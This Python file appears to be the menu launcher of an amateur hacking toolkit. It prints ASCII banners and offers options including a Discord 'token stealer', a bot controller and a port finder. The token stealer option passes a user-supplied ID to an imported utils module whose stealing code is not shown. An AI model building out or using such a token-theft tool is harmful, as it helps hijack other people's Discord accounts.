import os
import utils
print("  ____    ___   ____       _  _____   ____  _____   ___ \n |  _ \  / _ \ |  _ \     | || ____| / ___||_   _| / _ \ \n | |_) || | | || |_) | _  | ||  _|  | |      | |  | | | |\n |  __/ | |_| ||  _ < | |_| || |___ | |___   | |  | |_| |\n |_|     \___/ |_| \_\ \___/ |_____| \____|  |_|   \___/ ")

print('\n \n \n')
print('(1)discord')
print('(2)connect server')
print('\n \n \n')
a = input('>>>')
if a == "1":
    os.system('cls')
    print("____   _                              _ \n|  _ \ (_) ___   ___   ___   _ __   __| | \n| | | || |/ __| / __| / _ \ | '__| / _` | \n| |_| || |\__ \| (__ | (_) || |   | (_| | \n|____/ |_||___/ \___| \___/ |_|    \__,_|")
    print('\n \n \n')
    print('(1)token stealer')
    print('(2)bot controler')
    print('\n \n \n')
    a = input('>>>')
    if a == "1":
        os.system('cls')
        print("____   _                              _ \n|  _ \ (_) ___   ___   ___   _ __   __| | \n| | | || |/ __| / __| / _ \ | '__| / _` | \n| |_| || |\__ \| (__ | (_) || |   | (_| | \n|____/ |_||___/ \___| \___/ |_|    \__,_|")
        print('\n \n \n')
        a = input('ID>>>')
        utils.discord.token_stealer.take(a)
if a == '2':
    os.system('cls')
    print("  ____                                   _  \n/ ___|  ___   _ __   _ __    ___   ___ | |_   ___  _ __ \n| |     / _ \ | '_ \ | '_ \  / _ \ / __|| __| / _ \| '__|\n| |___ | (_) || | | || | | ||  __/| (__ | |_ |  __/| |\n \____| \___/ |_| |_||_| |_| \___| \___| \__| \___||_|   ")
    print('\n \n \n')
    print('(1)server_connecter')
    print('(2)port_finder')
    print('\n \n \n')
    a = input('>>>')
    if a == '1':
        exit()
    if a == '2':
        os.system('cls')
        os.system('python /utils/server/port_finder.py')